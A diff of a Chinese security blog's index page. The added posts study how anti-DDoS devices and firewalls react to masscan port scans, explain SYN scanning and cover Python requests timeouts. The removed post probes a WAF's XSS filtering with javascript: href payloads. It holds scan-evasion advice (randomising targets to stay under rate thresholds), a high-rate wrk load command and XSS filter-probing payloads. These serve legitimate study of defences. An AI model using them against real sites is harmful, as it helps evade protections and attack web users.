instance-fj5pftdp.51400: Flags [F.], seq 1, ack 3, win 114, options [nop,nop,TS val 556123427 ecr 2405982046], length 0</span><br><span class="line">18:15:53.611924 IP instance-fj5pftdp.51400 &gt; x.x.x.x.http: Flags [.], ack 2, win 213, options [nop,nop,TS val 2405982078 ecr 556123427], length 0</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，总共八个包：前三个握手、后四个挥手、中间一个包传tcp数据。</p>
+<p>中间并没有rst，首包syn也并没有被丢。</p>
+<p>结论：</p>
+<ul>
+<li>不是rst方式的防火墙</li>
+<li>不是首包丢弃的防火墙</li>
+</ul>
+</li>
+<li><p>判断防火墙是否syn-ack代理</p>
+<p>思路：在未被拉黑时，向x.x.x.x不存在tcp服务的端口发送syn包，如果能收到syn-ack，就说明防火墙做了syn-ack代理</p>
+<p>结论：防火墙没有syn-ack代理功能</p>
+</li>
+<li><p>拉黑后客户端发包能收到什么？</p>
+<p>经过测试，ip被拉黑后：</p>
+<ul>
+<li>客户端发出去的syn包、ack包得不到任何响应</li>
+<li>udp包可以正常通过（traceroute可以收到icmp回包）</li>
+</ul>
+</li>
+<li><p>什么时候会被防火墙拉黑？</p>
+<p>简单来说，存在两种可能性：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 频率超过一定限制 (主流的做法)</span><br><span class="line">* 扫到&quot;陷阱端口&quot;  (非主流的做法)</span><br></pre></td></tr></table></figure>
+
+<p>“陷阱端口”的概念见<a target="_blank" rel="noopener" href="https://github.com/EtherDream/anti-portscan">anti-portscan</a></p>
+<p>向80端口高频发出syn包，过了一会就被拉黑了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -ti --rm docker.io&#x2F;williamyeh&#x2F;wrk -t4  -c40000 -d 10000 http:&#x2F;&#x2F;x.x.x.x</span><br></pre></td></tr></table></figure>
+
+<p>基于下面四点原因，可以排除”陷阱端口”这种防御检测方式。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* &quot;陷阱端口&quot;这种方式比较复杂、比较非主流</span><br><span class="line">* 因为可能和业务端口冲突，所以部署在机房中的硬件防火墙不太可能基于&quot;陷阱端口&quot;检测</span><br><span class="line">* 后面确认了目标Linux系统上用了firewalld防火墙，主机上并没有&quot;陷阱端口&quot;这种机制</span><br><span class="line">* 测试结果表明 &quot;频率超过一定限制&quot; 后，ip就被拉黑了</span><br></pre></td></tr></table></figure>
+
+<p>结论：基于频率封禁ip</p>
+</li>
+</ul>
+<h1 id="为什么会出现问题背景中的奇怪现象"><a href="#为什么会出现问题背景中的奇怪现象" class="headerlink" title="为什么会出现问题背景中的奇怪现象"></a>为什么会出现问题背景中的奇怪现象</h1><ul>
+<li><p>为什么防火墙会返回syn-ack？</p>
+<p>如前面的分析，防火墙虽然没有syn-ack代理功能，但是在扫描端口时，目的端口不存在服务的syn包却收到了syn-ack响应。</p>
+<p>换句话说，就是”syn包频率过快”时，就会收到大量的syn-ack响应。</p>
+<p>虽然知道了这个现象，但是不清楚为啥会这样。问人和查资料后，在<a target="_blank" rel="noopener" href="https://forum.huawei.com/enterprise/zh/thread-373115.html">【华安解密之DDoS攻防】11 TCP原理篇之SYN Flood</a>找到一些线索。</p>
+<p>如文中所说，ddos设备会做源认证来识别客户端是否合法，此时就会响应syn-ack包。</p>
+<p>所以，当扫描端口时，”syn包频率过快”，引起ddos设备做源认证。</p>
+<p>因为一直没有回ack包，所以一直没有通过源认证。</p>
+<p>因为没有通过源认证，同时又在不断的发syn包，所以ddos设备会接着做认证，不断地回syn-ack包。这个时候ddos设备也不会拉黑ip。</p>
+</li>
+<li><p>为什么防火墙会返回syn-ack和icmp呢？</p>
+<p>有了上面的理解，这里也容易猜了。</p>
+<p>估计是执行<code>echo 111 | nc x.x.x.x 28328</code>时，此时正处于源认证阶段，客户端执行命令刚好能完成正常的三次握手，被识别成正常客户端，因此ddos设备把客户端加白了。</p>
+<p>加白后，包转发到后端目标机器上。目标机器因为firewalld防火墙，所以返回icmp包</p>
+</li>
+<li><p>为什么”扫描结果不稳定：有时显示大量端口开放、有时显示一个不固定的端口开放（比如44736）”？</p>
+<p>经过测试后，准确的说现象应该是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. masscan扫描，然后发现大量端口开放</span><br><span class="line">2. nc完成一次正常连接</span><br><span class="line">3. masscan再次扫描，然后发现ip被拉黑，并且结果中显示有一个开放端口（此端口号不固定）</span><br></pre></td></tr></table></figure>
+
+<p>估摸着，ddos安全策略如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 客户端用masscan扫描，触发源认证</span><br><span class="line">2. nc完成正常连接，通过源认证。此时设备将客户端加白</span><br><span class="line">3. 客户端用masscan再次扫描，因为客户端已经加白了，同时syn包频率异常，所以设备需要再次验证客户端是否正常，不过这次只回一次syn-ack包</span><br><span class="line">4. 客户端masscan 因为收到一次syn-ack包，所以显示有一个端口开放。同时masscan回rst包</span><br><span class="line">5. 设备收到rst包后，认为客户端是恶意的，直接拉黑</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="怎么规避这种防火墙获取到正确的端口信息？"><a href="#怎么规避这种防火墙获取到正确的端口信息？" class="headerlink" title="怎么规避这种防火墙获取到正确的端口信息？"></a>怎么规避这种防火墙获取到正确的端口信息？</h1><p>最简单的一种规避手段：如果目标ip足够多，masscan/nmap扫时随机化扫描地址，就应该到不了频率阈值。</p>
+<p>照这个想法，按理说fofa、钟馗之眼 等空间绘测产品应该能准确识别开放端口。验证了一下：有两三个不该显示的端口、实际开放的端口也并没有获取完全（可能是数据更新的问题）。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在这个案例中，主要整清楚了：</p>
+<ul>
+<li>链路上有哪些防火墙？<ul>
+<li>主机防火墙firewalld，策略是默认策略，比较简单</li>
+<li>机房中的防ddos设备</li>
+</ul>
+</li>
+<li>防ddos设备的防护策略有哪些？<ul>
+<li>源认证</li>
+<li>首包丢弃</li>
+<li>握手时rst</li>
+</ul>
+</li>
+<li>什么时候会触发防护策略？<ul>
+<li>频率达到阈值</li>
+</ul>
+</li>
+<li>触发防护策略后会发生啥？<ul>
+<li>要不拉黑；要不就暂时加白</li>
+</ul>
+</li>
+</ul>
+<p>另外可以在云厂商控制台上看看云上抗ddos产品的功能和文档，也能了解ddos产品防护策略有哪些，虽然可能不全。</p>
+<p>如果发现内容结论有问题，请后台联系我。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://github.com/nmap/nmap/issues/1904">从nmap的issue看到有人遇到同样问题</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-05-25-%E4%B8%BA%E4%BB%80%E4%B9%88masscan%E5%BF%AB%EF%BC%88%E4%B8%80%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-05-25-%E4%B8%BA%E4%BB%80%E4%B9%88masscan%E5%BF%AB%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">为什么masscan扫描快（一）</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-05-25 19:53:26" itemprop="dateCreated datePublished" datetime="2021-05-25T19:53:26+08:00">2021-05-25</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-06-03 19:22:53" itemprop="dateModified" datetime="2021-06-03T19:22:53+08:00">2021-06-03</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>某天想到一个常见的安全面试问题：”为什么masscan扫描快？”</p>
+<p>以往我认为是下面三点原因：</p>
+<ul>
+<li>使用syn扫描</li>
+<li>扫描地址随机化</li>
+<li>发包和接受包使用了性能更好的pf_ring包处理框架</li>
+</ul>
+<p>随着最近补了一些网络的基础知识，感觉有点不对劲：</p>
+<ul>
+<li>nmap也支持syn扫描、扫描地址随机化，所以masscan真的是因为这两点比nmap快么？</li>
+<li>nmap用的是啥发包，它为什么不用pf_ring呢？</li>
+<li>pf_ring真的快么？</li>
+</ul>
+<p>这一篇文章主要记录我对syn扫描的学习和做扫描器时遇到的案例。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="什么是syn扫描？"><a href="#什么是syn扫描？" class="headerlink" title="什么是syn扫描？"></a>什么是syn扫描？</h2><p>  也叫半连接扫描，基于sendto系统调用。</p>
+<p>  在syn扫描出现之前，端口扫描大多数基于connect系统调用，因此会完成tcp三次握手。</p>
+<h2 id="为什么要用syn扫描？"><a href="#为什么要用syn扫描？" class="headerlink" title="为什么要用syn扫描？"></a>为什么要用syn扫描？</h2><p>  一般都会说syn有三个好处：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 更隐蔽（相比于connect扫描）</span><br><span class="line">* 更快（相比于connect扫描）</span><br><span class="line">* 比ACK&#x2F;Window&#x2F;Maimon scans等扫描方式（namp的-sA&#x2F;sW&#x2F;sM参数）兼容性好</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><p>真的更隐蔽么？</p>
+<p>说syn扫描隐蔽的原因是”被扫描主机”和”IDS/IPS”设备 因为没有看到完整的”三次握手”，所以不会记录日志。</p>
+<p>然而现在的防护设备似乎都认识syn扫描，所以已经没有”更隐蔽”这个优势了。</p>
+</li>
+<li><p>为什么比connect扫描快？</p>
+<p>我以前的误区是connect扫描握手需要三个包，而syn扫描是只需要两个包，少发了一个包所以更快。</p>
+<p>实际上更快的原因是：</p>
+<p>当客户端发出去的syn包后收不到响应时（”网络质量不好”或者”扫描目标ip不存在”时会发生）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* connect扫描因为用的是connect系统调用，所以会重传syn包。在linux默认配置时，最多会等待32s才会返回</span><br><span class="line"></span><br><span class="line">* syn扫描因为使用sendto系统调用，它把syn包发出去后就可以立马返回，不会等syn-ack包</span><br></pre></td></tr></table></figure>
+
+<p>一个需要阻塞等待，另一个发送完就返回了，那肯定是发完就返回的快啊。</p>
+<p>看到这里，不知道你会不会质疑我：发完就返回，不等syn-ack包，那syn扫描怎么判断端口是开放的。</p>
+</li>
+</ul>
+<h2 id="syn扫描是怎么判断端口是开放的？"><a href="#syn扫描是怎么判断端口是开放的？" class="headerlink" title="syn扫描是怎么判断端口是开放的？"></a>syn扫描是怎么判断端口是开放的？</h2><p>  虽然sendto系统调用”不等待syn-ack包”，但是当syn-ack包来的时候我们再接着处理就好了。</p>
+<p>  比如当系统接收到一个syn-ack包，我们看一下包是不是从我们扫描对象发过来的，如果是我们就可以从syn-ack包中取出端口信息，认为目标端口是开放的。当然为了防止一些误报，我们还可以做一些检查。</p>
+<p>  所以在syn扫描实现时，我们可以采用两个线程（masscan也是这么实现的）：</p>
+<ul>
+<li>一个线程专门来发syn包</li>
+<li>另一个线程专门来接收syn-ack包，从syn-ack包中判断端口是否开放</li>
+</ul>
+<h2 id="show-me-the-demo"><a href="#show-me-the-demo" class="headerlink" title="show me the demo"></a>show me the demo</h2><p>  网上找的一个demo <a target="_blank" rel="noopener" href="https://blog.csdn.net/u011721501/article/details/38642133">简单实现SYN端口扫描</a></p>
+<p>  发送请求：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sockfd &#x3D; socket(AF_INET,SOCK_RAW,IPPROTO_TCP)  # 使用SOCK_RAW创建原始套接字</span><br><span class="line">..</span><br><span class="line">int ret &#x3D; sendto(sockfd,buffer,sizeof(tcpHeader),0,(struct sockaddr*)&amp;target,sizeof(target)) ;  # 发送syn包后立马返回</span><br></pre></td></tr></table></figure></p>
+<p>  接收请求：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">size &#x3D; recvfrom(sockfd,msg,sizeof(msg),0,(struct sockaddr*)&amp;myaddr,&amp;len) ;  &#x2F;&#x2F; 阻塞接收ack包</span><br></pre></td></tr></table></figure></p>
+<h2 id="之前做扫描器实践中遇到的案例"><a href="#之前做扫描器实践中遇到的案例" class="headerlink" title="之前做扫描器实践中遇到的案例"></a>之前做扫描器实践中遇到的案例</h2><p>  端口扫描结果中发现有的ip开放了5000+个端口，并且端口上似乎没有什么业务。</p>
+<p>  估摸着我可能遇到了 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2a03fb550cf5">DDOS之syn flood 原理及防护</a> 中提到的syn代理。</p>
+<p>  防火墙只要遇到syn包都回syn-ack,这样syn扫描时就会认为端口是开放的。</p>
+<p>  PS：下次再碰到这样的目标详细看看。如果读者有现成的目标案例，欢迎公众号私信给我。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>syn扫描比connect扫描快是因为connect扫描不太受用户程序控制，有可能等待很久。</li>
+<li>syn扫描实现会有两个线程，一个线程负责发syn包，另一个线程负责接收syn-ack包、判断端口开放、回rst包</li>
+</ul>
+<p>另外nmap的文档关于syn扫描和connect扫描都写得很好，值得阅读。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://nmap.org/book/synscan.html#scan-methods-fig-syn-scan-open">nmap官方文档-syn扫描</a></li>
+<li><a target="_blank" rel="noopener" href="https://nmap.org/book/scan-methods-connect-scan.html">nmap官方文档-connect扫描</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-05-08-requests.get%E5%8D%A1%E4%BD%8F/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -251,10 +936,16 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2021-05-08 14:37:34 / 修改时间：14:38:43" itemprop="dateCreated datePublished" datetime="2021-05-08T14:37:34+08:00">2021-05-08</time>
+      <time title="创建时间：2021-05-08 14:37:34" itemprop="dateCreated datePublished" datetime="2021-05-08T14:37:34+08:00">2021-05-08</time>
     </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-05-20 10:02:56" itemprop="dateModified" datetime="2021-05-20T10:02:56+08:00">2021-05-20</time>
+      </span>
 
   
 </div>
@@ -275,9 +966,9 @@
 </ul>
 <h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="requests库中timeout参数的具体含义是什么"><a href="#requests库中timeout参数的具体含义是什么" class="headerlink" title="requests库中timeout参数的具体含义是什么?"></a>requests库中timeout参数的具体含义是什么?</h2><ul>
 <li><p>requests库中timeout参数是什么?</p>
-<p>  根据<a target="_blank" rel="noopener" href="https://docs.python-requests.org/en/master/user/advanced/#timeouts">官网文档</a>所说,timeout可以表示(connect超时时间,read超时时间)</p>
+<p>根据<a target="_blank" rel="noopener" href="https://docs.python-requests.org/en/master/user/advanced/#timeouts">官网文档</a>所说,timeout可以表示(connect超时时间,read超时时间)</p>
 </li>
-<li><p>什么是connect超时？</p>
+<li><p>什么是connect超时?</p>
 <p>客户端需要connect系统调用来和服务端做tcp三次握手，当服务地址在互联网上不存在时，connect系统调用耗时就会比较长。</p>
 <p>比如请求1.1.2.3 过一段时间后会返回一个connect tiemout:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import requests;requests.get(&quot;http:&#x2F;&#x2F;1.1.2.3&quot;)&#39;</span><br></pre></td></tr></table></figure>
@@ -291,26 +982,22 @@
 <p>而request的timeout参数就可以减少这个等重传的时间。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import requests;requests.get(&quot;http:&#x2F;&#x2F;1.1.2.3&quot;, timeout&#x3D;(1, 100))&#39; # 1s的connect超时设置</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>怎么实现的connect超时控制？</p>
-<p>  connect、read等系统调用是没有参数可以控制超时时间的，那connect超时控制是怎么实现的呢？</p>
-<p>  在Modules/socketmodule.c可以找到connect函数的实现</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. socket设置成非阻塞模式</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">sock_call_ex(...,_PyTime_t timeout) &#123;</span><br><span class="line">  ...</span><br><span class="line">  interval &#x3D; timeout;</span><br><span class="line">  ...</span><br><span class="line">  res &#x3D; internal_select(s, writing, interval, connect);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int internal_select(PySocketSockObject *s, int writing, _PyTime_t interval,</span><br><span class="line">            int connect)&#123;</span><br><span class="line">  ...</span><br><span class="line">  ms &#x3D; _PyTime_AsMilliseconds(interval, _PyTime_ROUND_CEILING);</span><br><span class="line">  ...</span><br><span class="line">  n &#x3D; poll(&amp;pollfd, 1, (int)ms);  2. poll系统调用，如果超时,poll系统调用就会返回</span><br></pre></td></tr></table></figure>
+<li><p>怎么实现的connect超时控制?</p>
+<p>connect、read等系统调用是没有参数可以控制超时时间的，那connect超时控制是怎么实现的呢?</p>
+<p>在Modules/socketmodule.c可以找到connect函数的实现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. socket设置成非阻塞模式</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">sock_call_ex(...,_PyTime_t timeout) &#123;</span><br><span class="line">  ...</span><br><span class="line">  interval &#x3D; timeout;</span><br><span class="line">  ...</span><br><span class="line">  res &#x3D; internal_select(s, writing, interval, connect);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int internal_select(PySocketSockObject *s, int writing, _PyTime_t interval,</span><br><span class="line">            int connect)&#123;</span><br><span class="line">  ...</span><br><span class="line">  ms &#x3D; _PyTime_AsMilliseconds(interval, _PyTime_ROUND_CEILING);</span><br><span class="line">  ...</span><br><span class="line">  n &#x3D; poll(&amp;pollfd, 1, (int)ms);  2. poll系统调用，如果超时,poll系统调用就会返回</span><br></pre></td></tr></table></figure>
 
-<p>  流程如下:</p>
-<ul>
-<li><p>设置socket为非阻塞模式后，调用connect系统调用</p>
-</li>
-<li><p>使用poll系统调用来判断是否超时</p>
+<p>流程如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 设置socket为非阻塞模式后，调用connect系统调用</span><br><span class="line">* 使用poll系统调用来判断是否超时</span><br></pre></td></tr></table></figure>
+
 <p>实际上这是一种很通用的对connect做超时控制的方式，在其他tcp客户端中也可以这么实现超时控制。</p>
 </li>
-</ul>
-</li>
-<li><p>什么是read超时？</p>
-<p>  客户端需要调用read系统调用来读取服务端发送的数据，如果服务端一直不发送数据，读数据时就会卡住。</p>
-<p>  比如我们用nc命令开启一个服务端只负责监听建立链接,不发送数据.</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 8081</span><br></pre></td></tr></table></figure>
-<p>  客户端请求nc开启的服务,代码如下,3s后会出现读超时</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:8081&quot;, timeout&#x3D;(1,3)) # read超时时间设置成3s</span><br></pre></td></tr></table></figure>
+<li><p>什么是read超时?</p>
+<p>客户端需要调用read系统调用来读取服务端发送的数据，如果服务端一直不发送数据，读数据时就会卡住。</p>
+<p>比如我们用nc命令开启一个服务端只负责监听建立链接,不发送数据.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 8081</span><br></pre></td></tr></table></figure>
+<p>客户端请求nc开启的服务,代码如下,3s后会出现读超时</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:8081&quot;, timeout&#x3D;(1,3)) # read超时时间设置成3s</span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
@@ -318,8 +1005,8 @@
 <p>  文档中只说了timeout控制connect、read两个阶段，说明dns解析耗时很久时timeout是管不了的。<br>  我自己实验，也得出相同的结论：dns解析时间即使超过timeout，也不会抛出异常。</p>
 <p>  connect阶段在上面已经分析过，timeout是可以控制这一阶段最多花费多长时间的。</p>
 <p>  Python中的read超时不是一个全局的时间，它只是在每一次读socket时不能超过这个时间。而一次响应的读取可能有多次read操作。这儿可能和其他的http客户端（比如curl）等超时时间含义不同。</p>
-<p>  如果服务端能够让客户端read非常多次，且每一次时间都不超过timeout值，这个时候客户端会卡住。</p>
-<p>  所以，在下面两种情况下是会造成timeout参数“失效”的:</p>
+<p>  如果服务端能够让客户端read非常多次，且每一次时间都不超过read timeout值，这个时候客户端会卡住。</p>
+<p>  所以，在下面两种情况下是会造成read timeout参数“失效”的:</p>
 <ul>
 <li><p>响应中content-length是一个特别大的数，服务端缓慢的每次响应1字节</p>
 </li>
@@ -1036,493 +1723,8 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-03-11-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(2)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-03-11-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(2)/" class="post-title-link" itemprop="url">细品某语义waf的xss防护(2)</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-03-11 19:32:06 / 修改时间：19:57:35" itemprop="dateCreated datePublished" datetime="2021-03-11T19:32:06+08:00">2021-03-11</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><ul>
-<li>危险的属性（可以用作xss攻击）<ul>
-<li>href属性</li>
-<li>src属性</li>
-<li>on事件属性</li>
-<li>srcdoc属性</li>
-<li>xlink:href</li>
-<li>action</li>
-<li>formaction</li>
-<li>data (object标签)</li>
-</ul>
-</li>
-</ul>
-<p>假设攻击场景如下：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xss漏洞输出位置如下:</span><br><span class="line"></span><br><span class="line">  &lt;div&gt;用户输出可控位置&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">攻击者利用标签的危险属性执行JS，比如:</span><br><span class="line"></span><br><span class="line">  &lt;div&gt;&lt;a href&#x3D;&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;&lt;&#x2F;div&gt;   利用href属性</span><br></pre></td></tr></table></figure></p>
-<p>验证在这个场景下厂商的安全防护策略</p>
-<p>分析思路：</p>
-<ol>
-<li>针对每个危险属性分别测试厂商的防护</li>
-<li>改变payload，根据拦截情况推测安全防护策略</li>
-</ol>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="挨个测试每个属性"><a href="#挨个测试每个属性" class="headerlink" title="挨个测试每个属性"></a>挨个测试每个属性</h2><ul>
-<li>href属性</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;xx href&#x3D;&quot;javascript:xxxaaaaa&quot;&gt; 拦截</span><br><span class="line">a&#x3D;&lt;xx id&#x3D;&quot;javascript:xxxaaaaa&quot;&gt;  不拦截</span><br><span class="line">a&#x3D;&lt;xx idxx&#x3D;&quot;javascript:xxxaaaaa&quot;&gt;  不拦截</span><br><span class="line">说明和属性名称有关系，有一个黑名单属性list。href属性名称会进入拦截策略</span><br><span class="line"></span><br><span class="line">a&#x3D;&lt;xx href&#x3D;&quot;javascript:xxxaaaaa&quot;&gt; 拦截</span><br><span class="line">a&#x3D;&lt;xx href&#x3D;&quot;javascriptxxx:xxxaaaaa&quot;&gt; 不拦截</span><br><span class="line">a&#x3D;&lt;xx href&#x3D;&quot;javascriptxxx:alert(1)&quot;&gt; 不拦截</span><br><span class="line">a&#x3D;&lt;xx href&#x3D;&quot;xjavascript:alert(1)&quot;&gt; 不拦截</span><br><span class="line"></span><br><span class="line">a&#x3D;&lt;xx href&#x3D;&quot;javascript:a&quot;&gt; 拦截</span><br><span class="line">a&#x3D;&lt;xx href&#x3D;&quot;javascript:&quot;&gt; 不拦截</span><br><span class="line">a&#x3D;&lt;xx href&#x3D;&quot;javascript:a&#123;&quot;&gt; 拦截</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">说明和属性值也有关系，href属性值 必须以javascript:开头，且后面跟随至少一个字符串。 这里属性值并没有判断JS语法正确性</span><br></pre></td></tr></table></figure>
-
-<p>小结：任意标签 &amp;&amp; href属性 &amp;&amp; href属性值匹配 <code>javascript:[\s\S]+</code> 则拦截</p>
-<ul>
-<li>src属性</li>
-</ul>
